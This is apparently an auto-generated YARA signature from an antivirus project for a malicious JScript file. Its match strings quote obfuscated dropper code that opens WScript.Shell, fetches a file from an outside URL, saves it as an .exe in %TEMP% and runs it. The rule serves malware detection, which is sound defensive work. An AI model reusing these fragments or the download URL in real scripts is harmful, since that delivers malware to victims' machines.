rule sig_20160401_868ae69bf874b416c7745f287a76f3e2 {
  meta:
    description = "datamaliciousorder - file 20160401_868ae69bf874b416c7745f287a76f3e2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "86a4a68e3ce9d9b592928bdf19ee2d11c74d17fb0a1d13332c9daa1bb85c0995"

  strings:
    $s1  = "var NdEl = function VxySr() {return WScript[OncHv](\"WScript\"+\".Shell\");}(), QvPto = 11;" fullword ascii
    $s2  = "function NmqEia(SjGsj, GrnFhe){GaJs = GaJs * 1; return SjGsj - GrnFhe;};" fullword ascii
    $s3  = "CkqHv[KuBvy](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s4  = "if (CkqHv[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZzRr() {return NdEl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"FJA6erzxKtv8zL6.ex\" + \"e\";};" fullword ascii
    $s6  = "function KqUm(){return NhmOl + \"\";};" fullword ascii
    $s7  = "function PsdOxg() {return ((GgdVyi == true) && (GgdVyi == CrcFxh)) ? 1 : GaJs;};" fullword ascii
    $s8  = "var ZcsIav = new this[\"Date\"]();" fullword ascii
    $s9  = "function VzlRzo(CeqYe) {var TaQv = (1, 2, 3, 4, 5, CeqYe); return TaQv;};" fullword ascii
    $s10 = "function EqVk(){return 23;};" fullword ascii
    $s11 = "CrcFxh = true; " fullword ascii
    $s12 = "}while (HeyZur);" fullword ascii
    $s13 = "var ArrFew = false;" fullword ascii
    $s14 = "var GgdVyi = false;" fullword ascii
    $s15 = "function MdLa(){return OncHv;};" fullword ascii
    $s16 = "function VsHrn(UrUr){NdEl[\"R\"+\"un\"](UrUr, GaJs, GaJs);};" fullword ascii
    $s17 = "function ZtYr()" fullword ascii
    $s18 = "GgdVyi = true; " fullword ascii
    $s19 = "return NmqEia(ChcEcx, EskVh);" fullword ascii
    $s20 = "var CrcFxh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}